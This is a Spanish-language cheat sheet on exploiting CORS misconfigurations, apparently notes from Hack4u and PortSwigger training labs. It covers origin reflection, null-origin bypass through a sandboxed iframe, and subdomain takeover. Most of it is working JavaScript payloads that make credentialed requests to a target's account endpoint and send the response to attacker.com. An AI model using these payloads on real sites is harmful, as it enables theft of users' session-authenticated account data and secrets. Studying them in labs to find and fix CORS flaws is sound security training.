---

### 🌐 **CORS (Cross-Origin Resource Sharing) Cheat Sheet**  

---
---

## **Payloads y Ataques Relacionados**

### **Lab 1: Origin Manipulation**
**Request:**
```http
Origin: https://gustavo.com
```
**Response:**
```http
Access-Control-Allow-Origin: https://gustavo.com
Access-Control-Allow-Credentials: true ---> Permite que el navegador envie cookies, tokens de sesions, etc.
```

**Exploitation:**

*Payload Hack4u*
```javascript
<script> 
	var req = new XMLHttpRequest();
	req.onload = function() {
		location = "https://attacker.com/?data=" + btoa(req.responseText);
	};	
	req.open("GET","https://target.com/accountDetails",true);
	req.withCredentials = true;
	req.send();
</script>
```

*Payload Portswigger*
```javascript
<script>
  var xhr = new XMLHttpRequest();
  xhr.open('GET', 'https://target.com/accountDetails', true);
  xhr.withCredentials = true;
  xhr.onreadystatechange = function () {
    if (xhr.readyState === XMLHttpRequest.DONE) {
      fetch('/log?data=' + xhr.responseText);
    }
  };
  xhr.send(null);
</script>
```

---

### **Lab 2: Origin Null Bypass**
**Request:**
```http
Origin: null
```
**Response:**
```http
Access-Control-Allow-Origin: null
Access-Control-Allow-Credentials: true
```

**Exploitation:**

- **`allow-scripts`** ---> te da la capacidad de correr tu código JS en el iframe.

- **`srcdoc`** ---> te mete directamente el payload JS sin necesidad de un archivo externo.

- **`Sin allow-same-origin`** ---> mantenés el origen nulo, que es lo que explota la falla CORS.

*Payload hack4u*
```javascript
<iframe style="display: none;" sandbox="allow-scripts" srcdoc="
<script>
  var xhr = new XMLHttpRequest();
  xhr.open('GET', 'https://target.com/accountDetails', true);
  xhr.withCredentials = true;
  xhr.onreadystatechange = function () {
    if (xhr.readyState === XMLHttpRequest.DONE) {
      fetch('https://attacker.com/log?data=' + xhr.responseText);
    }
  };
  xhr.send(null);
</script>"></iframe>
```

*Payload Portswigger*
```javascript
<iframe style="display: none;" sandbox="allow-scripts" srcdoc="
<script> 
	var req = new XMLHttpRequest();
	req.onload = function() {
		location = 'https://attacker.com/?data=' + btoa(req.responseText);
	};	
	req.open('GET','https://target.com/accountDetails',true);
	req.withCredentials = true;
	req.send();
</script>"></iframe>
```

---

### **Lab 3: Subdomain Takeover with CORS**
**Request:**
```http
Origin: https://gustavo.target.com
```
**Response:**
```http
Access-Control-Allow-Origin: https://gustavo.target.com
Access-Control-Allow-Credentials: true
```

**Exploitation:**
- Tomar control del subdominio gustavo.target.com (subdomain takeover) o inyectar JavaScript mediante XSS en ese origen. Desde allí, aprovechar la configuración insegura de CORS para realizar peticiones autenticadas al dominio principal y exfiltrar datos sensibles (ej. API keys, información de cuenta) usando los payloads anteriores.
---

